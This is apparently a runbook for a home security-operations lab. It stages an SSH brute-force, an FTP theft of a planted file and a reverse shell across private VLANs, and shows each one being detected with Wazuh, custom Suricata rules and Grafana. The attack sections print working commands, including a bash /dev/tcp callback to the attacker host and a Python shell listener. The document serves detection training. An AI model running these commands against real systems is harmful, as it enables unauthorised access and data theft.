@@ -1,0 +1,138 @@
+========================================================
+   SOC LAB - PHASE 2 IMPLEMENTATION (FINAL, RECORD-READY)
+   Routed network | Attacker 10.10.20.40 (VLAN 20)
+   Verify: logs on the sensor/manager + Grafana
+========================================================
+
+TARGETS / ADDRESSING
+  client (throwaway)   VLAN 10   10.10.10.50    (admin 192.168.56.30)
+  honeypot             VLAN 20   10.10.20.70    (Cowrie + vsftpd)
+  attacker             VLAN 20   10.10.20.40
+  wazuh (SOC manager)  VLAN 10   10.10.10.20    (admin 192.168.56.20)
+  sensor tap           VLAN 20   enp0s8         (admin 192.168.56.10)
+  VyOS router          10.10.10.1 <-> 10.10.20.1
+
+The 3 attacks form one intrusion chain:
+  GET IN (brute-force) -> STEAL (FTP exfil) -> CONTROL (reverse shell)
+
+
+--------------------------------------------------------
+PART 0 - CONNECTIVITY CHECK (prove the routed topology)
+--------------------------------------------------------
+# attacker console:
+ping -c2 10.10.20.70      # honeypot, SAME segment   -> ttl=64
+ping -c2 10.10.10.50      # client,  CROSS segment    -> ttl=63 (router hop)
+
+Say: "ttl 63, not 64 - that missing hop is the VyOS router. In Phase 1
+one wire saw everything; now traffic only crosses through the router,
+and my sensor sits on the exposed VLAN 20 side."
+
+
+--------------------------------------------------------
+ATTACK 1 - SSH BRUTE-FORCE (cross-segment)      MITRE T1110
+  Tactic: Credential Access | Plane: Endpoint | ATTRIBUTION test
+--------------------------------------------------------
+Attacker brute-forces the client THROUGH the router.
+
+# attacker console:
+for i in $(seq 1 12); do ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=2 baduser$i@10.10.10.50 true 2>/dev/null; done
+
+PROOF (endpoint alert names the REAL attacker - no NAT):
+  ssh soc@192.168.56.20 'sudo grep -E "5760|5712" /var/ossec/logs/alerts/alerts.log | grep 10.10.20.40 | tail -5'
+  -> Rule 5712, SRC = 10.10.20.40 on the client.
+
+GRAFANA: 02 Incidents -> Src 10.10.20.40 -> client
+
+Say: "The attack crossed a router, yet Wazuh still names the real
+attacker 10.10.20.40 - because pure routing has no NAT. Attribution
+survived. In Phase 3 a firewall will take that away."
+
+
+--------------------------------------------------------
+ATTACK 2 - FTP DATA EXFILTRATION (from the honeypot)   MITRE T1048.003
+  Tactic: Exfiltration | Plane: Network | CUSTOM RULES 9000020/21
+--------------------------------------------------------
+FTP is cleartext, so the sensor sees the login and the file theft.
+
+Setup (honeypot, one time):
+  sudo apt install -y vsftpd
+  sudo useradd -m ftpuser 2>/dev/null; echo 'ftpuser:Passw0rd' | sudo chpasswd
+  echo "CLASSIFIED: SSNs and admin passwords" | sudo tee /home/ftpuser/secret_data.txt
+  sudo sed -i 's/^#local_enable=YES/local_enable=YES/' /etc/vsftpd.conf
+  sudo systemctl restart vsftpd
+
+Custom rules (sensor /var/lib/suricata/rules/local.rules):
+  alert tcp any any -> any 21 (msg:"LAB FTP Cleartext Login - PASS on the wire"; flow:established,to_server; content:"PASS "; classtype:policy-violation; sid:9000020; rev:1;)
+  alert tcp any any -> any 21 (msg:"LAB FTP Data Exfiltration - RETR of a file"; flow:established,to_server; content:"RETR "; classtype:policy-violation; sid:9000021; rev:1;)
+
+Attack (attacker):
+  ftp -inv 10.10.20.70 <<'EOF'
+  user ftpuser Passw0rd
+  get secret_data.txt /tmp/stolen.txt
+  bye
+  EOF
+  cat /tmp/stolen.txt        # the stolen data, in the clear
+
+PROOF:
+  Sensor:  sudo grep "FTP Data Exfiltration" /var/log/suricata/eve.json | tail -3
+  GRAFANA: 03 Network -> LAB FTP Cleartext Login + LAB FTP Data Exfiltration
+           sourced 10.10.20.40 -> 10.10.20.70
+
+Say: "FTP sends the password and the filename in plain text. My sensor
+watched the attacker log in and RETR the classified file off the
+honeypot - and my own custom rule flagged both. This is why the
+network plane exists: it sees what the endpoint can't."
+
+
+--------------------------------------------------------
+ATTACK 3 - REVERSE SHELL / C2 (cross-segment)   MITRE T1059.004 / T1071
+  Tactic: Command & Control | Plane: Network | CUSTOM RULE 9000031
+--------------------------------------------------------
+Victim reaches OUT to the attacker - a firewall watching inbound misses it.
+
+Custom rule (sensor):
+  alert tcp any any -> any 4444 (msg:"LAB Reverse Shell - outbound TCP to 4444"; flow:established,to_server; classtype:trojan-activity; sid:9000031; rev:1;)
+
+Attacker listener (attacker console):
+  python3 -c 'import socket,pty,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);print("listening 4444");c,a=s.accept();print("conn from",a);[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+
+Victim callback (client console, VLAN 10):
+  bash -i >& /dev/tcp/10.10.20.40/4444 0>&1
+
+Prove control (in the attacker's shell): hostname ; id ; ip -br a
+  -> you are running commands ON the client, from VLAN 20.
+
+PROOF:
+  Sensor:  sudo grep "Reverse Shell" /var/log/suricata/eve.json | tail -3
+           -> 10.10.10.50 -> 10.10.20.40:4444
+  GRAFANA: 03 Network -> connection to port 4444
+
+Say: "A reverse shell means the victim calls OUT to the attacker's C2.
+The client on VLAN 10 beacons to my listener on VLAN 20, crossing the
+router. My sensor catches the connection, both real IPs intact, and my
+custom rule flags the C2 by name."
+
+
+--------------------------------------------------------
+SUMMARY - the intrusion chain (say on camera)
+--------------------------------------------------------
+1  SSH brute-force   T1110       Credential Access   Endpoint  (Wazuh 5712)
+2  FTP exfiltration  T1048.003   Exfiltration        Network   (custom 9000020/21)
+3  Reverse shell     T1071       Command & Control   Network   (custom 9000031)
+
+"Three stages of a real intrusion - get in, steal, keep control -
+across a routed network. Every stage detected, and every attacker
+address preserved. That is Phase 2."
+
+
+--------------------------------------------------------
+PRECHECKS (before recording)
+--------------------------------------------------------
+Tools on attacker:   sudo apt install -y ftp
+Client SSH open:     ssh soc@192.168.56.20 'nc -zv -w2 10.10.10.50 22'
+FTP up on honeypot:  ssh ... (or console) sudo ss -tlnp | grep :21
+Clocks synced (UTC = Bahrain - 3h) on all VMs.
+Grafana time picker: Last 15 minutes.
+
+Snapshot: phase2-final  (includes vsftpd + all custom rules)
+========================================================
